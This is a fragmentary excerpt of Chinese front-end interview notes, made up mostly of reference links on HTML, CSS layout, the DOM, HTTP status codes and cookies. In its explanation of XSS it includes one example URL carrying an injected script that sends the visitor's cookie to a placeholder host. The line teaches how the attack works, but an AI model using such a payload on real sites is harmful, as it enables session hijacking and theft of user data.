...
> 参考: [如何理解Web语义化？](http://www.zhihu.com/question/20455165)
...
> 参考: [HTML <!DOCTYPE> Declaration](http://www.w3schools.com/tags/tag_doctype.asp)
...
> [参考1](http://segmentfault.com/a/1190000008840116)，[参考2](http://zhuanlan.zhihu.com/p/25455672)
...
> [参考](http://segmentfault.com/a/1190000006104095)
...
> [参考](http://leohxj.gitbooks.io/front-end-database/html-and-css-basic/box-module.html)
...
> 比如: 访问有个网站http://127.0.0.1/?name=lowols会输出用户名字。如果恶意用户传递这样的url：http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;，这样就可以把当前的cookie发送到指定的站点：www.xxx.com。
...
> [参考](http://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.3.md)
...
> [参考](http://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.1.md)
...
<body>
    <div>
        <img src="http://unsplash.it/200/300/?random" alt="me">
    </div>
    <div>
...
> [图片来源](http://www.w3.org/TR/navigation-timing/)
...
+ [Navigation Timing API](http://developer.mozilla.org/en-US/docs/Web/API/Navigation_timing_API)
...
> [参考](http://stackoverflow.com/questions/729921/settimeout-or-setinterval)
...
现在我们谈一下401和403的区别，这个问题在Stack Overflow上获得很大的关注: [403 Forbidden vs 401 Unauthorized HTTP responses](http://stackoverflow.com/questions/3297048/403-forbidden-vs-401-unauthorized-http-responses)
...
301和302的区别也获得很大的关注:[HTTP redirect: 301 (permanent) vs. 302 (temporary)](http://stackoverflow.com/questions/1393280/http-redirect-301-permanent-vs-302-temporary)
...
> 其他有关状态码的，你可以参考[HTTP Diagram and Status Codes](http://www.loggly.com/blog/http-status-code-diagram/)

## 使用flex布局实现三等分

题目要求: 使用flex布局实现三等分，左右两个元素分别贴到左边和右边，垂直居中

<p data-height="265" data-theme-id="light" data-slug-hash="bRZzwo" data-default-tab="css,result" data-user="maoxiake" data-embed-version="2" data-pen-title="a flex layout" class="codepen">See the Pen <a href="http://codepen.io/maoxiake/pen/bRZzwo/">a flex layout</a> by lowols (<a href="http://codepen.io/maoxiake">@maoxiake</a>) on <a href="http://codepen.io">CodePen</a>.</p>
...
> 参考: [JavaScript中的BOM与DOM详解](http://m.blog.csdn.net/Sornets/article/details/46999227) [What is the DOM and BOM in JavaScript?](http://stackoverflow.com/questions/4416317/what-is-the-dom-and-bom-in-javascript)
...
> 参考: [javascript类数组转换为数组](http://www.zuojj.com/archives/218.html)  [Array.prototype.slice()](http://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/slice)
...
> 参考: [What happens when you type a URL in browser](http://edusagar.com/articles/view/70/What-happens-when-you-type-a-URL-in-browser)  [What really happens when you navigate to a URL](http://igoro.com/archive/what-really-happens-when-you-navigate-to-a-url/)  [从输入URL到页面加载发生了什么？](http://segmentfault.com/a/1190000006879700)
...
参考[严格模式](http://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Strict_mode)
...
参考: [事件代理 delegate 的实现](http://zhuanlan.zhihu.com/p/27554181)  [手写事件模型及事件代理/委托](http://www.w3cmark.com/2016/439.html)  [JavaScript事件委托原理&实现](JavaScript事件委托原理&实现)
...
参考： [4 Types of Memory Leaks in JavaScript and How to Get Rid Of Them](http://auth0.com/blog/four-types-of-leaks-in-your-javascript-code-and-how-to-get-rid-of-them/)

中文翻译： [4种JavaScript内存泄漏浅析及如何用谷歌工具查内存泄露](http://github.com/wengjq/Blog/issues/1)
...
![内容溢出到外面了](http://segmentfault.com/image?src=http://images.cnitblog.com/blog/349636/201310/23224343-9668661a8f63445699e0a8c24a64662b.jpg&objectId=1190000004865198&token=554e24d525d3a82a18721e9d6489337f)
...
还有其他的方法，可参考 [CSS-清除浮动](http://segmentfault.com/a/1190000004865198)
...
> 参考 [深入理解cookie与session](http://blog.csdn.net/j903829182/article/details/39855221)  [What is the difference between Sessions and Cookies in PHP?](http://stackoverflow.com/questions/6339783/what-is-the-difference-between-sessions-and-cookies-in-php)
...
+ [移动web 1像素边框 瞧瞧大公司是怎么做的](http://segmentfault.com/a/1190000007604842)
+ [移动端的touch click事件的理解+点透](http://www.jianshu.com/p/dc3bceb10dbb)
+ [移动端页面开发，到底用Click多还是Touch事件多？](http://segmentfault.com/q/1010000008376883?_ea=1643695)
...
+ [HTML5 history API，创造更好的浏览体验](http://segmentfault.com/a/1190000002447556)
